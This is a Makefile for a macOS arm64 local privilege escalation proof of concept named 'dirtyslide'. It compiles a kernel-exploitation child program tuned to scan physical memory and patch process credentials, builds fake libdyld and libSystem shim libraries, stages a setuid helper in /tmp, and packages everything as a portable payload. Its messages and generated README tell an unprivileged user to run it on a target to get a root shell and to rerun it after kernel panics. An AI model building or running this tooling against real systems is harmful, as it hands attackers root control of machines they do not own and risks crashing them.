# Makefile — builds the LPE PoC and assembles a ready-to-run payload directory.
#
#   make                       build everything into ./dist. Copy dist/ ANYWHERE on the target
#                              (any user) and run ./dist/run.sh to pop root — no install path is
#                              baked in; the runner stages the setuid helper at /tmp/lpe_suidwrap.
#   make package               produce dist/ then zip it -> dirtyslide-poc.zip
#   make clean                 remove build outputs
#
# Requires: Xcode command-line tools (clang, codesign, install_name_tool), python3.

ARCH        := arm64
ARCH_E      := arm64e
DIST        := dist
SRC         := src
SCR         := scripts
SHIM        := $(DIST)/fakelib

# proven exploit geometry
PAGES       := 1024
TARGET_MAPS := 2
SR_MAL_MAP  := $(shell printf '0x%xULL' $$(( 0x180000000 + $(PAGES)*0x4000*$(TARGET_MAPS) )))
TARGET_SIZE := $(shell echo $$(( $(PAGES)*0x4000 )))

CHILD_CFLAGS := -arch $(ARCH) -Wall -O0 -fno-stack-protector -fno-builtin \
  -fno-asynchronous-unwind-tables -fno-unwind-tables -nostdlib -Wl,-static -Wl,-e,_start \
  -Wl,-no_pie -Wl,-stack_addr,0x160000000 -Wl,-stack_size,0x100000 -Wl,-headerpad,0x1000

CHILD_DEFS := -DSTART_OFFSET=0x8000 '-DVALUE_ADD=(0ULL-0x4000ULL)' -DALT_START_OFFSET=0 \
  -DALT_START_MODE=0 -DTHREE_PAGE_COVER=0 -DGROOM_PAIRS=0 -DKEEP_PATTERN=0 -DACTIVE_START_PERIOD=1 \
  -DACTIVE_START_PHASE=0 -DACTIVE_START_FIRST=0 -DACTIVE_START_LAST=0xffff -DPTE_ENTRY_INDEX=0 \
  -DPTE_DISTANCE_PAGES=2 -DSR_MAL_MAP=$(SR_MAL_MAP) -DPAGE_STARTS_COUNT=$(PAGES) -DALL_STARTS=1 \
  -DTARGET_TOUCH_PAGES=0 -DRUNTIME_HELPER=0 -DPREFLT_ASCENDING=0 -DTARGET_SIZE=$(TARGET_SIZE) \
  -DTARGET_MAPS=$(TARGET_MAPS) -DTARGET_FAULT_MAPS=0 -DTARGET_NOAUTH=0 -DTARGET_SPLIT_FILES=0 \
  -DORACLE_SCAN_AFTER_EACH_MAP=1 -DPREFLT_PAGES=$(PAGES) -DORACLE_REGIONS=2048 -DORACLE_TRACK_PAGES=4 \
  -DORACLE_WITH_HOLES=1 -DORACLE_HOLE_PAGES=2 -DORACLE_DEFER_HOLE_FREE=1 -DORACLE_HOLE_FREE_ORDER=1 \
  -DORACLE_BEFORE_SETUP=0 -DORACLE_EXTRA_PAGE_INDEX=0xffff -DORACLE_PTE_SCAN=1 -DORACLE_PTE_SCAN_WORDS=64 \
  -DORACLE_PTE_WRITE_ALIAS=1 -DORACLE_PTE_WRITE_SRC_INDEX=1 -DORACLE_PTE_WRITE_DST_INDEX=2 \
  -DORACLE_PTE_EXISTING_ALIAS_SCAN=1 -DORACLE_PTE_EXISTING_ALIAS_ALLOW_SELF=1 -DORACLE_PTE_OWNER_RESTORE_DST=1 \
  -DORACLE_PTE_OWNER_MAP_TEST=1 -DORACLE_PTE_OWNER_MAP_INDEX=3 -DORACLE_PTE_PHYS_SCAN=1 \
  -DORACLE_PTE_ALIAS_WRITE_LIMIT=16 -DORACLE_PTE_PHYS_SCAN_WINDOW_STRIDE=0x2000000ULL \
  -DORACLE_PTE_PHYS_SCAN_BASE=0x80000000ULL -DORACLE_PTE_PHYS_SCAN_PAGES=2044 -DORACLE_PTE_PHYS_SCAN_CHUNKS=256 \
  -DORACLE_PTE_PHYS_SCAN_RESTORE=1 -DORACLE_PTE_PHYS_SCAN_REVERSE=0 -DORACLE_PTE_PHYS_SCAN_DUMP=0 \
  -DORACLE_PTE_PHYS_SCAN_SEARCH_WORD=0 -DORACLE_PTE_PHYS_CRED_SCAN=1 -DORACLE_PTE_PHYS_CRED_ANY_GID=1 \
  -DORACLE_PTE_PHYS_CRED_PATCH=1 -DORACLE_PTE_PHYS_CRED_RESTORE_MISS=1 -DORACLE_PTE_PHYS_CRED_MAX_PATCH=256 \
  -DORACLE_PTE_PHYS_SCRUB=1 '-DORACLE_PTE_PHYS_SCRUB_VALUE=(0ULL-0x4000ULL)' \
  -DSUID_HANDOFF=1 -DORACLE_STOP_AFTER_ROOT_HIT=1 \
  -DORACLE_PTE_OWNER_MAP_RESTORE=1 -DORACLE_ROOT_PROOF=1 -DORACLE_EXIT_AFTER_ROOT_PROOF=0 \
  -DSURVIVE_LOOP=1 -DABORT_ON_SETUP_FAIL=1 -DWIPE_ARGV_STRINGS=1

.PHONY: all package clean
all: $(DIST)/reslide_child $(DIST)/reslide_launcher $(DIST)/suidwrap \
     $(SHIM)/libdyld.dylib $(SHIM)/libSystem.B.dylib $(DIST)/run.sh $(DIST)/README.txt
	@echo ""
	@echo "[+] payload ready in ./$(DIST)  (portable: no install path baked in)"
	@echo "    1. copy dist/ ANYWHERE on the target VM, as any unprivileged user"
	@echo "    2. run there:  ./dist/run.sh   -> pops a root shell on success"
	@echo "    (re-run on panic; ~50% per attempt)"

$(DIST) $(SHIM):
	@mkdir -p $@

$(DIST)/reslide_child: $(SRC)/t_reslide_zf.c $(SCR)/patch-static-child-dyld.py | $(DIST)
	clang $(CHILD_CFLAGS) $(CHILD_DEFS) -o $@.static $<
	python3 $(SCR)/patch-static-child-dyld.py $@.static $@
	codesign -s - -f $@
	@rm -f $@.static

$(DIST)/reslide_launcher: $(SRC)/launcher.c | $(DIST)
	clang -arch $(ARCH) -O2 -o $@ $<
	codesign -s - -f $@

$(DIST)/suidwrap: $(SRC)/suidwrap.c | $(DIST)
	clang -arch $(ARCH) -O2 -o $@ $<
	codesign -s - -f $@

$(SHIM)/libdyld.dylib: $(SRC)/fake_libdyld.cpp $(SCR)/set-segment-flag.py | $(SHIM)
	clang++ -arch $(ARCH_E) -dynamiclib -fno-rtti -fno-exceptions -nostdlib++ -Wl,-headerpad,0x1000 \
	  -Wl,-install_name,/usr/lib/system/libdyld.dylib -Wl,-current_version,0.0.0 \
	  -Wl,-compatibility_version,0.0.0 -o $@.raw $<
	python3 $(SCR)/set-segment-flag.py $@.raw $@.s1 __DATA_CONST 0x10
	python3 $(SCR)/set-segment-flag.py $@.s1 $@ __AUTH_CONST 0x10
	codesign -s - -f $@
	@rm -f $@.raw $@.s1

$(SHIM)/libSystem.B.dylib: $(SRC)/fake_libsystem.c $(SCR)/add-load-dylib.py | $(SHIM)
	clang -arch $(ARCH_E) -dynamiclib -Wl,-headerpad,0x1000 -Wl,-install_name,/usr/lib/libSystem.C.dylib \
	  -Wl,-current_version,1356.0.0 -Wl,-compatibility_version,1.0.0 -o $@.raw $<
	cp $@.raw $@.idb
	install_name_tool -id /usr/lib/libSystem.B.dylib $@.idb
	python3 $(SCR)/add-load-dylib.py $@.idb $@ /usr/lib/system/libdyld.dylib
	codesign -s - -f $@
	@rm -f $@.raw $@.idb

$(DIST)/run.sh: $(SCR)/run-on-guest.sh | $(DIST)
	cp $< $@ && chmod +x $@

$(DIST)/README.txt: | $(DIST)
	@{ \
	  echo "LPE PoC payload - run on a macOS arm64 target as an unprivileged user."; \
	  echo ""; \
	  echo "Portable: copy this directory anywhere on the target, as any unprivileged user."; \
	  echo "(It stages a setuid helper at /tmp/lpe_suidwrap at runtime; nothing is baked in.)"; \
	  echo ""; \
	  echo "Run as a normal (unprivileged) user:   ./run.sh"; \
	  echo "On success it drops you into a root shell (uid=0)."; \
	  echo "The physical scan is ~50% likely to panic the kernel; on panic the VM reboots -"; \
	  echo "just run ./run.sh again. The first success is enough."; \
	} > $@

package: all
	@rm -f dirtyslide-poc.zip
	cd $(DIST) && zip -r -q ../dirtyslide-poc.zip . -x '*.DS_Store'
	@echo "[+] packaged ./dirtyslide-poc.zip"

clean:
	rm -rf $(DIST) dirtyslide-poc.zip
	@echo "[+] cleaned"
